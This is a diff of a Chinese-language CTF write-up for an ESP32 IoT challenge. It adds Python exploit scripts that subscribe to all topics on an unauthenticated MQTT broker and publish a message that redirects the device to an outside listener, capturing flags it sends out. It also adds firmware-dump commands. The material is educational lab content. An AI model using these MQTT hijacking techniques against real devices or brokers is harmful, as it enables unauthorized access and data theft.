@@ -185,7 +185,7 @@ I (389671) GATT: 54 48 55 43 54 46 7b 41 64 56 44 34 37 61 7d
 mqtt_app_start("mqtt://mqtt.esp32ctf.xyz");
 ```
 
-这个域名对应的服务器上启了一个为未授权未认证的MQTT broker，也就是本项目中的那个docker。对于MQTT的收发包，推荐工具：[MQTT.fx](https://mqttfx.jensd.de/index.php/download)
+这个域名对应的服务器上启了一个为未授权未认证的MQTT broker，也就是本项目中的那个[docker](https://github.com/xuanxuanblingbling/esp32ctf_thu/blob/main/docker/Dockerfile)，对于MQTT的收发包，推荐工具：[MQTT.fx](https://mqttfx.jensd.de/index.php/download)
 
 
 ### task1 
@@ -197,9 +197,26 @@ mqtt_app_start("mqtt://mqtt.esp32ctf.xyz");
 
 ![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127175038978.png?raw=true)
 
+
+```python
+import paho.mqtt.client as mqtt
+
+def on_message(client, userdata, msg):
+    print(msg.topic+" , "+str(msg.payload))
+
+client = mqtt.Client()
+client.connect("mqtt.esp32ctf.xyz",1883,60)
+client.on_message = on_message
+client.subscribe("#")
+client.loop_forever()
 ```
-THUCTF{#_1s_God_in_MQTT}
+
 ```
+➜  python3 exp.py
+/topic/flag1 , b'THUCTF{#_1s_God_in_MQTT}'
+/topic/flag2/tdzloj , b'www.baidu.com?46'
+```
+
 
 ### task2 
 
@@ -210,11 +227,11 @@ THUCTF{#_1s_God_in_MQTT}
 
 
 ```
-root@vultr:~# nc -vvv  -l -p 80
-Connection received on 221.218.140.166 18214
-GET / HTTP/1.0
-User-Agent: esp-idf/1.0 esp32
-flag: THUCTF{attAck_t0_th3_dev1ce_tcp_r3cV_ch4nnel}
+import paho.mqtt.client as mqtt
+
+client = mqtt.Client()
+client.connect("mqtt.esp32ctf.xyz",1883,60)
+client.publish("/topic/flag2/tdzloj","49.233.20.19?-1")
 
 ```
 ### task3
@@ -227,27 +244,43 @@ flag: THUCTF{attAck_t0_th3_dev1ce_tcp_r3cV_ch4nnel}
 
 
 
-```
-root@vultr:~# nc -vvv  -l -p 80
-Connection received on 221.218.140.166 18263
-GET / HTTP/1.0
-User-Agent: esp-idf/1.0 esp32
-flag: THUCTF{attAck_t0_th3_dev1ce_tcp_r3cV_ch4nnel} 
-[+] MQTT task III: THUCTF{0ver_the_Air_y0u_c4n_a77ack_t0_1ntranet_d3v1ce}
+```python
+import paho.mqtt.client as mqtt
+from pwn import *
 
+io = listen(80)
+
+client = mqtt.Client()
+client.connect("mqtt.esp32ctf.xyz",1883,60)
+client.publish("/topic/flag2/tdzloj","49.233.20.19?-1")
+
+print(io.recv())                 
+```
+
+```
+ubuntu@VM-16-6-ubuntu:~$ sudo python3 exp.py 
+[+] Trying to bind to :: on port 80: Done
+[+] Waiting for connections on :::80: Got connection from ::ffff:61.148.244.254 on port 64616
+b'GET / HTTP/1.0\r\nUser-Agent: esp-idf/1.0 esp32\r\nflag: THUCTF{attAck_t0_th3_dev1ce_tcp_r3cV_ch4nnel} 
+[+] MQTT task III: THUCTF{0ver_the_Air_y0u_c4n_a77ack_t0_1ntranet_d3v1ce}\r\n\r\n'
+[*] Closed connection to ::ffff:61.148.244.254 port 64616
 ```
 
 ## 固件彩蛋
 
-```
+使用esptools dump固件：
+
+```python
 ➜   python ~/Desktop/esp/esp-idf2/components/esptool_py/esptool/esptool.py --baud 115200 --port /dev/tty.usbserial-14420 read_flash 0x10000 0x310000 dump.bin
 ```
 
-```
-esptool.py --baud 115200  read_flash 0x10000 0x310000 dump.bin
+windows上的IDF离线环境安装后，自动设置的环境变量中，也是可以直接用esptools.py的：
+
+```python
+> esptool.py --baud 115200  read_flash 0x10000 0x310000 dump.bin
 ```
 
-```
+```python
 $ sudo apt install binutils
 $ strings ./dump.bin  | grep "THUCTF{"
 THUCTF{DuMp_the_b1n_by_espt00l.py_Ju5t_1n_0ne_Lin3}
